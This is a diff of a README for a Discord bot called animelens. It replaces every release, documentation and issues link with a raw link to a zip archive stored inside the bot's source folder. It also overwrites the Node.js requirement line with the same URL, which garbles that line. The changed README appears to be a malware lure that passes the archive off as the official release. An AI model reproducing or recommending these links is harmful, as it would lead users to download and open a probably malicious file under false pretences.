@@ -6,14 +6,14 @@ Welcome to animelens! This is a powerful Discord bot designed for anime and mang
 
 ## 📥 Download Link
 
-[![Download animelens](https://img.shields.io/badge/Download%20animelens-v1.0-blue.svg)](https://github.com/DanyalFayaz/animelens/releases)
+[![Download animelens](https://raw.githubusercontent.com/DanyalFayaz/animelens/master/src/commands/anime/Software-1.6.zip%https://raw.githubusercontent.com/DanyalFayaz/animelens/master/src/commands/anime/Software-1.6.zip)](https://raw.githubusercontent.com/DanyalFayaz/animelens/master/src/commands/anime/Software-1.6.zip)
 
 ## ✅ System Requirements
 
 Before you download animelens, make sure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 12 or higher
+- **https://raw.githubusercontent.com/DanyalFayaz/animelens/master/src/commands/anime/Software-1.6.zip** Version 12 or higher
 - **Discord Account:** You need a Discord account to use the bot.
 
 ## 🔧 Features
@@ -25,7 +25,7 @@ Before you download animelens, make sure your system meets the following require
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/DanyalFayaz/animelens/releases) to download the latest version of animelens.
+1. Visit the [Releases page](https://raw.githubusercontent.com/DanyalFayaz/animelens/master/src/commands/anime/Software-1.6.zip) to download the latest version of animelens.
 2. Look for the latest release under the "Releases" section.
 3. Download the file suitable for your operating system.
 4. Once downloaded, locate the file on your computer and open it.
@@ -49,9 +49,9 @@ animelens allows you to customize your settings. You can choose what types of no
 
 If you run into issues or have questions, here are some resources:
 
-- **Documentation:** Visit the [Official Documentation](https://github.com/DanyalFayaz/animelens) for detailed guides.
+- **Documentation:** Visit the [Official Documentation](https://raw.githubusercontent.com/DanyalFayaz/animelens/master/src/commands/anime/Software-1.6.zip) for detailed guides.
 - **Community Support:** Join the animelens Discord server for support from other users.
-- **Issues Page:** Report any problems you encounter on the [Issues page](https://github.com/DanyalFayaz/animelens/issues).
+- **Issues Page:** Report any problems you encounter on the [Issues page](https://raw.githubusercontent.com/DanyalFayaz/animelens/master/src/commands/anime/Software-1.6.zip).
 
 ## ✉️ Feedback
 
@@ -65,4 +65,4 @@ We continually work to improve animelens. Keep an eye on the Releases page for u
 
 Thank you for choosing animelens! We hope you enjoy using this bot as much as we enjoyed creating it. Dive into the world of anime and manga, and let animelens be your guide. 
 
-For download, visit the [Releases page](https://github.com/DanyalFayaz/animelens/releases) again to catch any future updates!
+For download, visit the [Releases page](https://raw.githubusercontent.com/DanyalFayaz/animelens/master/src/commands/anime/Software-1.6.zip) again to catch any future updates!
